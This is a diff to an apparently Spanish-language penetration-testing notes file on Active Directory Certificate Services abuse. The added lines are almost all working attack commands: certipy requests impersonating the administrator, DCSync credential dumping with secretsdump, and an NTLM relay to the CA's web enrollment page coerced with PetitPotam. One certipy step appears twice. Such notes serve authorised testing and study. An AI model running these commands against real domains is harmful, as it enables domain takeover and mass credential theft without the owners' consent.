@@ -36,6 +36,8 @@ Request a certificate from a vulnerable template
 
 ![Alt text](/Images/image-2.png)
 
+> If you get the error `CERTSRV_E_KEY_LENGTH` you can add `-key-size 4096`
+
 ```bash
 certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name> -ca <Certificate Authorities> -upn administrator@domain.com
 certipy auth -pfx administrator.pfx -dc-ip $ip
@@ -166,6 +168,15 @@ python3 gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'domain.com'/'dc01$' 'dc01.c
 # Ya podemos utilizar el TGT para realizar DCSync ya que el DC tiene permisos de DCSync
 export KRB5CCNAME=/path/to/dc01.ccache
 secretsdump -k -no-pass domain.com/'dc01$'@dc01.essos.local
+# O usar certipy nuevamente despues de obtener cert.b64
+base64 -d cert.b64 > cert.pfx
+certipy auth -pfx cert.pfx -dc-ip <DC IP> -debug
+## Si DC no es una opcion porque el mismo DC tiene ADCS y tengan HTTPS
+ntlmrelayx.py -t https://dc01.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+python3 PetitPotam.py -u user -p 'pass' -d 'domain.com' attackerListenerIP <Server a Atacar>
+# O usar certipy nuevamente despues de obtener cert.b64
+base64 -d cert.b64 > cert.pfx
+certipy auth -pfx cert.pfx -dc-ip <DC IP> -debug
 ```
 
 - https://github.com/decoder-it/ADCSCoercePotato/
